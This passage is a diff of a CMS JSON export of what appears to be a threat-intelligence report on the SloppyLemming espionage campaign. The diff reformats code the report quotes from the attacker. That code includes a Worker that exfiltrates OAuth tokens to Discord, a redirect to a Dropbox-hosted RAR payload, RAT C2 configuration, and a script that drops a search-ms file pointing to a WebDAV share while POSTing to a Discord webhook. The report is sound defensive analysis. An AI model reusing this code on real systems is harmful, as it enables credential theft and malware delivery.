-													"value": " const tokenData = await tokenResponse.json();\n await sendToDiscord(tokenData);\n const pdfUrl = 'https://filebox-1-y7125191.deta[.]app/embed/e2570171795675b4';\n return Response.redirect(pdfUrl, 302);\n}",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "async function sendToDiscord(tokenData,userinfo) {\n const data = {\n   content: `Captured OAuth Token:\\n\\`\\`\\`json\\n${JSON.stringify(tokenData, null, 2)}\\n\\`\\`\\``\n };",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "Finally, another decoy PDF is displayed in the browser following the token's collection by the adversary. In this instance, the decoy PDF (as shown below) is a contract update between Taxila Heavy Industries (a Pakistani state-owned enterprise and defense contractor that produces tanks, personnel carriers, and other military vehicles) and a Pakistani metal fabrication company named International Fabrication Company.",
+													"value": "Finally, another decoy PDF is displayed in the browser following the token's collection by the adversary. In this instance, the decoy PDF is a contract update between Taxila Heavy Industries (a Pakistani state-owned enterprise and defense contractor that produces tanks, personnel carriers, and other military vehicles) and a Pakistani metal fabrication company named International Fabrication Company.",
 													"marks": [],
 													"content": null
 												}
@@ -2990,18 +2026,18 @@
 											"data": {
 												"target": {
 													"sys": {
-														"id": "5cL6rqXPZv8qlgC32hGQw6",
+														"id": "7bRiPg1Or3fFJliIHNYE6R",
 														"type": "Link",
 														"linkType": "Asset"
 													},
 													"related_asset": [
 														{
-															"contentfulId": "5cL6rqXPZv8qlgC32hGQw6",
+															"contentfulId": "7bRiPg1Or3fFJliIHNYE6R",
 															"locale": "en-US",
-															"title": "SloppyLemming - image 1",
+															"title": "Decoy PDF",
 															"file": {
-																"name": "image 1.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/5cL6rqXPZv8qlgC32hGQw6/151442736cf3dbbaa310a77a26b1de0b/image_1.png",
+																"name": "image4.png",
+																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/7bRiPg1Or3fFJliIHNYE6R/58e30c3a4fc9c63d05ffec6a5f45345a/image4.png",
 																"internal": {
 																	"mediaType": "image/png"
 																}
@@ -3025,7 +2061,7 @@
 											"content": []
 										},
 										{
-											"nodeType": "heading-2",
+											"nodeType": "paragraph",
 											"data": {
 												"target": null,
 												"uri": null
@@ -3039,7 +2075,28 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Malware Operations ",
+													"value": "",
+													"marks": [],
+													"content": null
+												}
+											]
+										},
+										{
+											"nodeType": "heading-3",
+											"data": {
+												"target": null,
+												"uri": null
+											},
+											"value": null,
+											"marks": null,
+											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "Malware operations ",
 													"marks": [],
 													"content": null
 												}
@@ -3081,7 +2138,51 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "...  ",
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "7aR1sqRGg3sr7vBZHfF3BT",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "7aR1sqRGg3sr7vBZHfF3BT",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 5",
+																	"markdown": "    ...  \n\n     if (!redirectUrl) {\n         return new Response('Bad request: Missing `redirectUrl` query param', { status: 400 });\n       }\n       if(redirectUrl.includes(\"CamScanner-06-10-2024-15.29.pdf\")){\n         return Response.redirect(\"https[:]//www.dropbox[.]com/scl/fi/67twsfn5xy8eanrp7mtw1/CamScanner-06-10-2024-15.29.rar?rlkey=w1kpjdd4iwl4p7c83wbiujw17&st=4i5ahlyz&dl=1\";\n\n    ...\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
 													"marks": [],
 													"content": null
 												}
@@ -3102,158 +2203,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": " if (!redirectUrl) {\n     return new Response('Bad request: Missing `redirectUrl` query param', { status: 400 });\n   }",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "   if(redirectUrl.includes(\"CamScanner-06-10-2024-15.29.pdf\")){\n     return Response.redirect(\"https[:]//www.dropbox[.]com/scl/fi/67twsfn5xy8eanrp7mtw1/CamScanner-06-10-2024-15.29.rar?rlkey=w1kpjdd4iwl4p7c83wbiujw17&st=4i5ahlyz&dl=1\";",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "...",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "The file hosted on Dropbox is a RAR file named \"CamScanner 06-10-2024 15.29.rar\" (SHA256 hash: a3c9b56a0ce787d7aa7787d9ff0e806a6fb0b216327591b1e1113391c609fd17).  The RAR likely attempts to exploit ",
+													"value": "The file hosted on Dropbox is a RAR file named \"CamScanner 06-10-2024 15.29.rar\" (SHA256 hash: a3c9b56a0ce787d7aa7787d9ff0e806a6fb0b2\n16327591b1e1113391c609fd17).  The RAR likely attempts to exploit ",
 													"marks": [],
 													"content": null
 												},
@@ -3322,45 +2272,6 @@
 											]
 										},
 										{
-											"nodeType": "embedded-asset-block",
-											"data": {
-												"target": {
-													"sys": {
-														"id": "51dznx7SwAwTlKlW9vJSA3",
-														"type": "Link",
-														"linkType": "Asset"
-													},
-													"related_asset": [
-														{
-															"contentfulId": "51dznx7SwAwTlKlW9vJSA3",
-															"locale": "en-US",
-															"title": "SloppyLemming - image 3",
-															"file": {
-																"name": "image 3.png",
-																"publicURL": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/51dznx7SwAwTlKlW9vJSA3/49540c8e7c68a391c696ab80c1eee052/image_3.png",
-																"internal": {
-																	"mediaType": "image/png"
-																}
-															}
-														}
-													],
-													"entry_elementMarkdown": [],
-													"entry_assetFile": [],
-													"entry_button": [],
-													"entry_elementLink": [],
-													"entry_page": [],
-													"entry_elementIcon": [],
-													"entry_bladeTable": [],
-													"entry_bladeThreeFeatures": [],
-													"entry_bladeFourFeatures": []
-												},
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": []
-										},
-										{
 											"nodeType": "paragraph",
 											"data": {
 												"target": null,
@@ -3369,6 +2280,50 @@
 											"value": null,
 											"marks": null,
 											"content": [
+												{
+													"nodeType": "text",
+													"data": {
+														"target": null,
+														"uri": null
+													},
+													"value": "",
+													"marks": [],
+													"content": null
+												},
+												{
+													"nodeType": "embedded-entry-inline",
+													"data": {
+														"target": {
+															"sys": {
+																"id": "33KbbJSi8bXSsj364CjOzE",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "33KbbJSi8bXSsj364CjOzE",
+																	"locale": "en-US",
+																	"entryTitle": "Malware Operations - Table content 1",
+																	"markdown": "\n| SHA256 Hash     | Filename    |\n| ---------- | ---------- |\n| CamScanner 06-10-2024 15.29.pdf       | fb4397c837c7e401712764f953723153d5bb4 62bc944518959288ea47dec6446       |\n| CamScanner 06-10-2024 15.29.pdf       | 95cf90b2610c6f0ec67c1d669cd252468f6c3b 8eaeea588f342d2bd74d90e093       |\n| CamScanner 06-12-2024 15.29.pdf .exe       | 337ca61e23bcb86f26dc40a36316621b74ec6 f29a55820899ed30b03b69a6025       |\n| CRYPTSP.dll      | 82e99ceea9e6d31555b0f2bf637318fd97e560 9e3d4d1341aec39db2e26cf211      |\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -3448,7 +2403,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "CRYPTSP.dll in turn acts as a downloader, which downloads from Dropbox a file named Outlook.eml (SHA256 hash: b6ae5b714f18ca40a111498d0991e1e30cd95317b4904d2ef0d49937f0552000). The file is not actually an email file, but a renamed Dynamic Link Library (DLL) with an internal name of NekroWire.dll. The final payload is a Remote Access Tool (RAT) that reaches out to several Cloudflare Workers, which all contain the same C2 address - redzone.apl-org[.]online. The Worker code that handles the C2 communications contains configuration information, which can be found below.",
+													"value": "CRYPTSP.dll in turn acts as a downloader, which downloads from Dropbox a file named Outlook.eml (SHA256 hash: b6ae5b714f18ca40a111498d0991e1e30cd9\n5317b4904d2ef0d49937f0552000). The file is not actually an email file, but a renamed Dynamic Link Library (DLL) with an internal name of NekroWire.dll. The final payload is a Remote Access Tool (RAT) that reaches out to several Cloudflare Workers, which all contain the same C2 address - redzone.apl-org[.]online. The Worker code that handles the C2 communications contains configuration information, which can be found below.",
 													"marks": [],
 													"content": null
 												}
@@ -3472,169 +2427,41 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
 												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
+														"target": {
+															"sys": {
+																"id": "CEZeCC9fIp1d8qZBX7fJ2",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "CEZeCC9fIp1d8qZBX7fJ2",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 6",
+																	"markdown": "\n    let new_agent_url = ['/s2/oz/images/stars/po/bubblev1/border_3.gif', '/_img/logo-icon-large-trans.png', '/_css/newskit.20240127181309.css', '/_css/merriweather.20231026151410.css', '/medium/2024/02/01102602e55ab9e.jpg?r=103509', '/medium/2017/06/5931466588b47.png', '/js/pubcid/latest/pubcid.min.js', '/news/card/1809196']\n    let command_url = ['/s2/oz/images/stars/po/bubblev1/spacer.gif', '/ajax/libs/lazysizes/5.3.2/lazysizes.min.js', '/pagead/js/adsbygoogle.js', '/thumbnail/2024/03/01143710cc64722.jpg?r=143820', '/news/card/1783810', '/thumbnail/2024/01/27081711bebc45a.png?r=083117', '/sdks/OneSignalPageSDKES6.js?v=151605', '/gtag/js?id=G-C521GRS8DF', '/_css/_jquery.focus-1.0.3.20230822133816.css', '/_css/print.20240130115108.css', '/_js/ad-sticky-close.20231027151511.js', '/safeframe/1-0-40/html/container.html', '/recaptcha/api2/aframe', '/_img/logo-icon--large-trans.png', '/bao-csm/aps-comm/aps_csm.js']\n    let response_url = ['/sodar/sodar2/225/runner.html', '/static/topics/topics_frame.html', '/_js/all.20231030131909.js', '/api/v1/sync/da41085a-a849-47c0-96e7-4b956b56f35e/web?callback=__jp0', '/activeview/js/current/ufs_web_display.js?cache=r20110914', '/s/subscriptions/subscribe_embed/css/www-subscribe-embed-card_v0.css', '/media/GFI5RgHWEAApVoO?format=jpg&name=small', '/profile_images/1567510144015106049/6L5e_S1N_normal.jpg', '/pagead/js/r20240129/r20110914/client/qs_click_protection_fy2021.js']\n    const c2_host =  \"redzone.apl-org[.]online\"\n    const protocolx = \"http\"\n    const fake_c2 = \"https[:]//www.dawn[.]com\"\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
 														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
+														"uri": null
+													},
+													"value": null,
+													"marks": null,
+													"content": []
 												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "let new_agent_url = ['/s2/oz/images/stars/po/bubblev1/border_3.gif', '/_img/logo-icon-large-trans.png', '/_css/newskit.20240127181309.css', '/_css/merriweather.20231026151410.css', '/medium/2024/02/01102602e55ab9e.jpg?r=103509', '/medium/2017/06/5931466588b47.png', '/js/pubcid/latest/pubcid.min.js', '/news/card/1809196']",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "let command_url = ['/s2/oz/images/stars/po/bubblev1/spacer.gif', '/ajax/libs/lazysizes/5.3.2/lazysizes.min.js', '/pagead/js/adsbygoogle.js', '/thumbnail/2024/03/01143710cc64722.jpg?r=143820', '/news/card/1783810', '/thumbnail/2024/01/27081711bebc45a.png?r=083117', '/sdks/OneSignalPageSDKES6.js?v=151605', '/gtag/js?id=G-C521GRS8DF', '/_css/_jquery.focus-1.0.3.20230822133816.css', '/_css/print.20240130115108.css', '/_js/ad-sticky-close.20231027151511.js', '/safeframe/1-0-40/html/container.html', '/recaptcha/api2/aframe', '/_img/logo-icon--large-trans.png', '/bao-csm/aps-comm/aps_csm.js']",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "let response_url = ['/sodar/sodar2/225/runner.html', '/static/topics/topics_frame.html', '/_js/all.20231030131909.js', '/api/v1/sync/da41085a-a849-47c0-96e7-4b956b56f35e/web?callback=__jp0', '/activeview/js/current/ufs_web_display.js?cache=r20110914', '/s/subscriptions/subscribe_embed/css/www-subscribe-embed-card_v0.css', '/media/GFI5RgHWEAApVoO?format=jpg&name=small', '/profile_images/1567510144015106049/6L5e_S1N_normal.jpg', '/pagead/js/r20240129/r20110914/client/qs_click_protection_fy2021.js']",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "const c2_host =  \"redzone.apl-org[.]online\"\nconst protocolx = \"http\"\nconst fake_c2 = \"https[:]//www.dawn[.]com\"",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
 												{
 													"nodeType": "text",
 													"data": {
@@ -3662,8 +2489,12 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "Separate SloppyLemming Infection Chain Observed",
-													"marks": [],
+													"value": "Separate SloppyLemming infection chain observed",
+													"marks": [
+														{
+															"type": "bold"
+														}
+													],
 													"content": null
 												}
 											]
@@ -3704,207 +2535,44 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "... ",
-													"marks": [],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": " ",
+													"value": "",
 													"marks": [],
 													"content": null
 												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
+														"target": {
+															"sys": {
+																"id": "6Z4zCy3BkWWSVoEn2OwzW8",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "6Z4zCy3BkWWSVoEn2OwzW8",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 7",
+																	"markdown": "    ... \n\n       <script type=\"text/javascript\">\n            // Function to send a message to Discord via webhook\n            function sendWebhookMessage() {\n                const webhookUrl = 'https://discordapp[.]com/api/webhooks/[redacted]';\n                const message = {\n                    content: 'User clicked the link to open the PITB document.(2nd campaign)'\n                };\n\n                // Send the message to the Discord webhook\n                fetch(webhookUrl, {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/json'\n                    },\n                    body: JSON.stringify(message)\n                });\n            }\n            function base64ToArrayBuffer(base64){\n                var binary_string = window.atob(base64);\n                var len = binary_string.length;\n                var bytes = new Uint8Array(len);\n                for(var i = 0; i < len; i++) {\n                    bytes[i] = binary_string.charCodeAt(i);\n                }\n                return bytes.buffer;\n            }\n            var file = 'PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8cGVyc2lzdGVkUXVlcnkgdmVyc2lvbj0iMS4wIj4NCiAgICA8cXVlcnk+DQogICAgICAgIDxraW5kTGlzdD4NCiAgICAgICAgICAgIDxraW5kIG5hbWU9Ikl0ZW0iLz4NCiAgICAgICAgPC9raW5kTGlzdD4NCiAgICAgICAgPHNjb3BlPg0KICAgICAgICAgICAgPGluY2x1ZGUgcGF0aCA9ICJcXHBpdGIuemFwdG8ub3JnQFNTTEA0NDNcd2ViZGF2XHBpdGIiLz4NCiAgICAgICAgPC9zY29wZT4NCiAgICA8L3F1ZXJ5Pg0KPC9wZXJzaXN0ZWRRdWVyeT4=';\n            var data = base64ToArrayBuffer(file);\n            var blob = new Blob([data], {type: 'octet/stream'});\n            var filename = 'PITB-JE5687.pdf.search-ms'; // Name of the file\n            var a = document.createElement('a');\n            document.body.appendChild(a);\n            a.style = 'display:none';\n            var url = window.URL.createObjectURL(blob);\n            a.href = url;\n            a.download = filename;\n            a.click();\n            window.URL.revokeObjectURL(url);\n                // Send the webhook message\n                sendWebhookMessage();\n        </script>\n    </body>\n    </html>\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
+														},
 														"uri": null
 													},
-													"value": "  <script type=\"text/javascript\">\n        // Function to send a message to Discord via webhook\n        function sendWebhookMessage() {\n            const webhookUrl = 'https://discordapp[.]com/api/webhooks/[redacted]';\n            const message = {\n                content: 'User clicked the link to open the PITB document.(2nd campaign)'\n            };",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "\n            // Send the message to the Discord webhook\n            fetch(webhookUrl, {\n                method: 'POST',\n                headers: {\n                    'Content-Type': 'application/json'\n                },\n                body: JSON.stringify(message)\n            });",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        }",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        function base64ToArrayBuffer(base64){\n            var binary_string = window.atob(base64);\n            var len = binary_string.length;\n            var bytes = new Uint8Array(len);\n            for(var i = 0; i < len; i++) {\n                bytes[i] = binary_string.charCodeAt(i);\n            }\n            return bytes.buffer;\n        }\n        var file = 'PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8cGVyc2lzdGVkUXVlcnkgdmVyc2lvbj0iMS4wIj4NCiAgICA8cXVlcnk+DQogICAgICAgIDxraW5kTGlzdD4NCiAgICAgICAgICAgIDxraW5kIG5hbWU9Ikl0ZW0iLz4NCiAgICAgICAgPC9raW5kTGlzdD4NCiAgICAgICAgPHNjb3BlPg0KICAgICAgICAgICAgPGluY2x1ZGUgcGF0aCA9ICJcXHBpdGIuemFwdG8ub3JnQFNTTEA0NDNcd2ViZGF2XHBpdGIiLz4NCiAgICAgICAgPC9zY29wZT4NCiAgICA8L3F1ZXJ5Pg0KPC9wZXJzaXN0ZWRRdWVyeT4=';",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "        var data = base64ToArrayBuffer(file);\n        var blob = new Blob([data], {type: 'octet/stream'});\n        var filename = 'PITB-JE5687.pdf.search-ms'; // Name of the file\n        var a = document.createElement('a');\n        document.body.appendChild(a);\n        a.style = 'display:none';\n        var url = window.URL.createObjectURL(blob);\n        a.href = url;\n        a.download = filename;\n        a.click();\n        window.URL.revokeObjectURL(url);\n            // Send the webhook message\n            sendWebhookMessage();\n    </script>\n</body>\n</html>",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
+													"value": null,
+													"marks": null,
+													"content": []
+												},
 												{
 													"nodeType": "text",
 													"data": {
@@ -3980,94 +2648,41 @@
 													"value": "",
 													"marks": [],
 													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
 												},
 												{
-													"nodeType": "text",
+													"nodeType": "embedded-entry-inline",
 													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
+														"target": {
+															"sys": {
+																"id": "nE60w8hahqY5uAUnsKyCy",
+																"type": "Link",
+																"linkType": "Entry"
+															},
+															"related_asset": [],
+															"entry_elementMarkdown": [
+																{
+																	"contentTypeId": "elementMarkdown",
+																	"contentfulId": "nE60w8hahqY5uAUnsKyCy",
+																	"locale": "en-US",
+																	"entryTitle": "Code Snippet Wrapper - 8",
+																	"markdown": "    JavaScript\n    <?xml version=\"1.0\"?>\n    <persistedQuery version=\"1.0\">\n      <query>\n        <kindList>\n          <kind name=\"Item\"/>\n        </kindList>\n        <scope>\n          <include path = \"\\\\pitb.zapto[.]org@SSL@443\\webdav\\pitb\"/>\n        </scope>\n      </query>\n    </persistedQuery>\n"
+																}
+															],
+															"entry_assetFile": [],
+															"entry_button": [],
+															"entry_elementLink": [],
+															"entry_page": [],
+															"entry_elementIcon": [],
+															"entry_bladeTable": [],
+															"entry_bladeThreeFeatures": [],
+															"entry_bladeFourFeatures": []
 														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
 														"uri": null
 													},
-													"value": "C++\n",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
+													"value": null,
+													"marks": null,
+													"content": []
 												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "<?xml version=\"1.0\"?>\n<persistedQuery version=\"1.0\">\n    <query>\n        <kindList>\n            <kind name=\"Item\"/>\n        </kindList>\n        <scope>\n            <include path = \"\\\\pitb.zapto[.]org@SSL@443\\webdav\\pitb\"/>\n        </scope>\n    </query>\n</persistedQuery>",
-													"marks": [
-														{
-															"type": "code"
-														}
-													],
-													"content": null
-												}
-											]
-										},
-										{
-											"nodeType": "paragraph",
-											"data": {
-												"target": null,
-												"uri": null
-											},
-											"value": null,
-											"marks": null,
-											"content": [
 												{
 													"nodeType": "text",
 													"data": {
@@ -4095,7 +2710,7 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "The current contents of pitb.zapto[.]org/webdav/pitb is a file named \"CIM and IT-Integration.pdf.url\" (SHA256 hash: e3bc0246ab95b527aa86e52e62f554ab8db04523f35aee50b508d0fa48ab49f7), which is actually an Internet Shortcut file that contains a URL to download a file:",
+													"value": "The current contents of pitb.zapto[.]org/webdav/pitb is a file named \"CIM and IT-Integration.pdf.url\" (SHA256 hash: e3bc0246ab95b527aa86e52e62f554ab8db045\n23f35aee50b508d0fa48ab49f7), which is actually an Internet Shortcut file that contains a URL to download a file:",
 													"marks": [],
 													"content": null
 												}
@@ -4116,126 +2731,141 @@
 														"target": null,
 														"uri": null
 													},
-													"value": "C",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
-													"value": "/",
-													"marks": [
-														{
-															"type": "code"
-														},
-														{
-															"type": "bold"
-														}
-													],
-													"content": null
-												},
-												{
-													"nodeType": "text",
-													"data": {
-														"target": null,
-														"uri": null
-													},
